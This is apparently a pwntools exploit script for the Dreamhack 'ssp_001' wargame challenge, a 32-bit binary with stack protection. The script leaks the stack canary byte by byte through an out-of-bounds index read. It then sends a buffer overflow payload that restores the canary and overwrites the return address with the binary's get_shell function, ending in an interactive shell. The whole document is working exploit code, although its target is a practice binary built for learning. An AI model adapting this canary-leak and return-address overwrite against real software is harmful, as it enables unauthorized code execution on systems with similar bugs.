from pwn import *

'''
idx 0x4 <- ebp-0x94
name_len 0x4 <- epb-0x90
select 0x8 <- ebp-0x8c
box 0x40 <- ebp-0x88
name 0x40 <- ebp-0x48
canary 0x4 <- ebp-0x8
'''


# Define slog function
def slog(n, m): return success(": ".join([n, hex(m)]))


# Connect
# HOST = 'host3.dreamhack.games'
# PORT = 12016
# p = remote(HOST, PORT)
p = process('./ssp_001')

# Set Context
context.os = 'linux'
context.arch = 'i386'
context.endian = 'little'
# context.log_level = 'debug'

# Address of get_shell
get_shell = 0x80486b9

# Get Canary
canary = b''
for i in range(0x04, 0, -1):
    p.sendafter(b'> ', b'P')
    p.sendlineafter(b'index : ', bytes(str(0x80 - 1 + i), 'utf-8'))
    p.recvuntil(b': ')
    canary += p.recvuntil(b'\n')[:-1]

canary = int(canary, 16)
slog('Canary', canary)

# Write Payload
payload = b'A'*0x40        # name
payload += p32(canary)     # canary
payload += b'B'*0x04       # Dummy Data
payload += b'C'*0x04       # SFP
payload += p32(get_shell)  # RET

# Exploit
p.sendafter(b'> ', b'E')
p.sendlineafter(b'Name Size : ', bytes(str(0x50), 'utf-8'))
p.sendafter(b'Name : ', payload)

p.interactive()
